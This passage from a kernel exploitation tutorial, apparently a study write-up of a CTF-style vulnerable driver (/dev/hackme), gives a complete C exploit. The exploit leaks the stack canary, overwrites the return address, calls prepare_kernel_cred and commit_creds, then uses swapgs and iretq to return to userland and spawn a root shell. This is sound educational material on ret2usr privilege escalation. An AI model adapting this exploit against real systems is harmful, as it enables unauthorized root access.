id="0d24bcea-79fd-4914-b2f8-f71d6aeae8d8" class="image"><a href="images/Untitled%2011.png"><img style="width:510px" src="images/Untitled%2011.png"/></a></figure><p id="62767f6e-9edc-4eff-9574-a3791149a945" class="">Now the write function will look like this:</p><pre id="5c9b728a-b9f0-410f-8518-5a002723aa29" class="code"><code>void overwrite_ret(int fd, unsigned long canary){
+	unsigned long payload[SIZE_TMP+10];
+
+	payload[SIZE_TMP] = canary;
+	payload[SIZE_TMP+1] = 0x00;
+  payload[SIZE_TMP+2] = 0x00;
+	payload[SIZE_TMP+3] = 0x00;	
+	payload[SIZE_TMP+4] = (unsigned long)getShell;
+	write(fd,payload,sizeof(payload));
+}</code></pre><p id="322cc39f-77ff-45e3-b63e-38730e5e4486" class="">There are three things left to be done. First, we need to save the current state of the userland. It&#x27;s important to call this function when starting the exploit chain. The following code will save the current user CS, SS, RSP, and FLAGS registers. The “<mark class="highlight-blue">pushf</mark>” instruction pushes flag values onto the stack, and after that, they are popped into the “<mark class="highlight-blue">userlandRFLAGS</mark>” variable in userland.</p><pre id="7059d1bf-1290-4c60-ba25-639815fc5b28" class="code"><code>unsigned long userlandCS, userlandSS, userlandRSP, userlandRFLAGS
+void save_state(){
+    __asm__(
+        &quot;.intel_syntax noprefix;&quot;
+        &quot;mov userlandCS, cs;&quot;
+        &quot;mov userlandSS, ss;&quot;
+        &quot;mov userlandRSP, rsp;&quot;
+        &quot;pushf;&quot;
+        &quot;pop userlandRFLAGS;&quot;
+        &quot;.att_syntax;&quot;
+    );
+}</code></pre><p id="0ff2c8aa-d66c-4a17-9a2d-2468b8257bca" class="">The article explains some concepts to return to the userland we can use <mark class="highlight-purple">sysretq </mark>or <mark class="highlight-purple">iretq </mark>insutrctions, so all the useland saved values can be used with the <mark class="highlight-purple">iretq </mark>function to perform the restoration of the registers, its important to known that the values needs to be into the stack. <a href="https://www.felixcloutier.com/x86/iret:iretd:iretq">https://www.felixcloutier.com/x86/iret:iretd:iretq</a> , <a href="https://os.phil-opp.com/returning-from-exceptions/">https://os.phil-opp.com/returning-from-exceptions/</a>. </p><p id="58fd923a-7a17-4422-a597-99306ac97fa5" class="">A instruction called <mark class="highlight-purple">swapgs </mark>is important to swap between kernel and user mode, it perform actions in GS register <a href="https://www.felixcloutier.com/x86/swapgs">https://www.felixcloutier.com/x86/swapgs</a>.</p><p id="579a2fdb-8916-459a-9ba7-278007efa1e6" class="">The article explains some concepts to return to userland. We can use <mark class="highlight-blue">sysretq </mark>or <mark class="highlight-blue">iretq </mark>instructions to do so, and all the userland saved values can be used with the <mark class="highlight-blue">iretq </mark>function to restore the registers. It&#x27;s important to note that the values need to be in the stack. Source: <a href="https://www.felixcloutier.com/x86/iret:iretd:iretq"><strong>https://www.felixcloutier.com/x86/iret:iretd:iretq</strong></a>, <a href="https://os.phil-opp.com/returning-from-exceptions/"><strong>https://os.phil-opp.com/returning-from-exceptions/</strong></a></p><p id="1e85ea98-9189-4aec-beaa-ab296a37c4cb" class="">An instruction called swapgs is important to swap between kernel and user mode. It performs actions on the GS register. Source: <a href="https://www.felixcloutier.com/x86/swapgs"><strong>https://www.felixcloutier.com/x86/swapgs</strong></a></p><p id="6a7368d7-dbd6-497d-a9b4-131106aeb9a4" class="">Final exploit:</p><pre id="f43abe75-c14c-4d15-916c-32050b6ebb5d" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define SIZE_TMP 16
+
+void overwrite_ret(int fd, unsigned long canary);
+unsigned long leak(int fd);
+void saveUserState(void);
+unsigned long userlandCS, userlandSS, userlandRFLAGS, userlandRSP;
+
+
+//ffffffff814c6410 T commit_creds
+//ffffffff814c67f0 T prepare_kernel_cred
+
+void saveUserState(void){
+    __asm__(
+        &quot;.intel_syntax noprefix;&quot;
+        &quot;mov userlandCS, cs;&quot;
+        &quot;mov userlandSS, ss;&quot;
+        &quot;mov userlandRSP, rsp;&quot;
+        &quot;pushf;&quot;
+        &quot;pop userlandRFLAGS;&quot;
+        &quot;.att_syntax;&quot;
+    );
+}
+
+void spawnShell(void){
+	system(&quot;/bin/sh&quot;);
+}
+
+unsigned long userlandRIP = (unsigned long)spawnShell;
+
+void getShell(void){
+		__asm__(
+        &quot;.intel_syntax noprefix;&quot;
+        &quot;movabs rax, 0xffffffff814c67f0;&quot; //prepare_kernel_cred
+        &quot;xor rdi, rdi;&quot;
+	    &quot;call rax; mov rdi, rax;&quot;
+	    &quot;movabs rax, 0xffffffff814c6410;&quot; //commit_creds
+	    &quot;call rax;&quot;
+		&quot;swapgs;&quot;
+		&quot;mov rdx, userlandSS;&quot;
+		&quot;push rdx;&quot;
+		&quot;mov rdx, userlandRSP;&quot;
+		&quot;push rdx;&quot;
+		&quot;mov rdx, userlandRFLAGS;&quot;
+		&quot;push rdx;&quot;
+		&quot;mov rdx, userlandCS;&quot;
+		&quot;push rdx;&quot;
+		&quot;mov rdx, userlandRIP;&quot;
+		&quot;push rdx;&quot;
+		&quot;iretq;&quot;
+		&quot;.att_syntax;&quot;
+		);
+}
+
+void overwrite_ret(int fd, unsigned long canary){
+	unsigned long payload[SIZE_TMP+10];
+	payload[SIZE_TMP] = canary;
+	payload[SIZE_TMP+1] = 0x00;
+  	payload[SIZE_TMP+2] = 0x00;
+	payload[SIZE_TMP+3] = 0x00;	
+	payload[SIZE_TMP+4] = (unsigned long)getShell;
+	printf(&quot;Canary = 0x%lx\n&quot;, canary);
+	write(fd,payload,sizeof(payload));
+}
+
+
+unsigned long leak(int fd){
+	unsigned long buf[SIZE_TMP+8];
+	read(fd, buf, sizeof(buf));
+	return buf[SIZE_TMP];
+}
+
+int main(void){
+	saveUserState();
+	int fd = open(&quot;/dev/hackme&quot;, O_RDWR);
+	if(!fd)
+		printf(&quot;[!]Error openning device\n&quot;);
+	else
+		printf(&quot;[OK]Device onpened\n&quot;);
+	unsigned long canary = leak(fd);
+	printf(&quot;Canary = 0x%lx\n&quot;, canary);
+	overwrite_ret(fd, canary);
+
+
+	return 0;
+}</code></pre><p id="d66f1a89-2058-4f98-b393-b327dc72a9e9" class="">The entire content of this report is based on LKMIDAS&#x27;s writeup about Linux Kernel exploitation 1, thank you for all the knowledge shared :)</p><p id="6d4d1ce6-ef78-49c4-8ca8-3631af7205b5" class="">For more details, please see: <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/"><strong>https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</strong></a>.</p></div></article></body></html>
